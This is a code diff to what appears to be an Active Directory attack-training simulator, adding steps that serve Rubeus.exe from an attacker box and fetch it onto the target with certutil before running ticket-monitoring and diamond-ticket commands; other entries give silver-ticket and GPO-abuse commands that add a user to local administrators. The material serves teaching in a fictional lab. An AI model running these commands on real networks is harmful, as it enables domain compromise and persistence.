@@ -930,14 +930,17 @@
       teach: 'Coercion tricks a target — often a DC — into authenticating to you (PetitPotam, PrinterBug). The machine-account hash you catch (DC01$) can be relayed to AD CS or LDAP for escalation. The DC authenticating to you is the whole point.',
     },
     'unconstrained-delegation': {
-      cmd: 'Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap', tool: 'rubeus',
-      output: [
-        '[*] Monitoring every 5 seconds for new TGTs',
-        '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
-        '[*] Base64EncodedTicket: doIF...',
-      ].join('\n'),
       signal: '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
-      teach: 'A host with unconstrained delegation caches the TGT of everyone who authenticates to it. Combine it with coercion to make a DC connect, capture DC01$\'s TGT, and you can DCSync. Watching for the DC\'s ticket is the goal.',
+      teach: 'A host with unconstrained delegation caches the TGT of everyone who authenticates to it. Rubeus is an .exe, so stage it first (serve from your box, pull it over with certutil), then run its monitor. Pair it with coercion to make a DC connect, capture DC01$\'s TGT, and you can DCSync. Watching for the DC\'s ticket is the goal.',
+      steps: [
+        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding Rubeus.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
+        { where: 'host', tool: 'rubeus', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/Rubeus.exe r.exe & r.exe monitor /interval:5 /filteruser:DC01$ /nowrap', output: [
+          'CertUtil: -URLCache command completed successfully.',
+          '[*] Monitoring every 5 seconds for new TGTs',
+          '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
+          '[*] Base64EncodedTicket: doIF...',
+        ].join('\n') },
+      ],
     },
     'silver-ticket': {
       cmd: 'impacket-ticketer -nthash <svc_hash> -domain-sid S-1-5-21-... -domain acme.internal -spn cifs/file01 administrator', tool: 'impacket-ticketer',
@@ -950,14 +953,17 @@
       teach: 'A silver ticket forges a service ticket using one service account\'s hash — scoped to that one service, but it never touches the DC, so it is quiet. Narrower than a golden ticket, and useful when all you have is a single service hash.',
     },
     'diamond-ticket': {
-      cmd: 'Rubeus.exe diamond /krbkey:<aes256> /user:jbloggs /password:Autumn2026! /ticketuser:administrator /domain:acme.internal', tool: 'rubeus',
-      output: [
-        '[*] Requesting a legitimate TGT for jbloggs',
-        '[*] Decrypting with the krbtgt key and modifying the PAC -> administrator',
-        '[+] Saving diamond ticket to administrator.ccache',
-      ].join('\n'),
       signal: '[+] Saving diamond ticket to administrator.ccache',
-      teach: 'A diamond ticket modifies a real TGT instead of forging one from scratch (a golden ticket), so its details match a genuine request and look less anomalous. Both need the krbtgt key — this is a stealthier flavour of the same post-DA persistence.',
+      teach: 'A diamond ticket modifies a real TGT instead of forging one from scratch (a golden ticket), so its details match a genuine request and look less anomalous. It is a Rubeus .exe, so stage it first (serve from your box, certutil it onto the target), then run the diamond command. Both ticket types need the krbtgt key — this is a stealthier flavour of the same post-DA persistence.',
+      steps: [
+        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding Rubeus.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
+        { where: 'host', tool: 'rubeus', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/Rubeus.exe r.exe & r.exe diamond /krbkey:<aes256> /user:jbloggs /password:Autumn2026! /ticketuser:administrator /domain:acme.internal', output: [
+          'CertUtil: -URLCache command completed successfully.',
+          '[*] Requesting a legitimate TGT for jbloggs',
+          '[*] Decrypting with the krbtgt key and modifying the PAC -> administrator',
+          '[+] Saving diamond ticket to administrator.ccache',
+        ].join('\n') },
+      ],
     },
     'gpo-abuse': {
       cmd: "pygpoabuse.py acme.internal/jbloggs:'Autumn2026!' -gpo-id <GUID> -command \"net localgroup administrators jbloggs /add\"", tool: 'pygpoabuse',
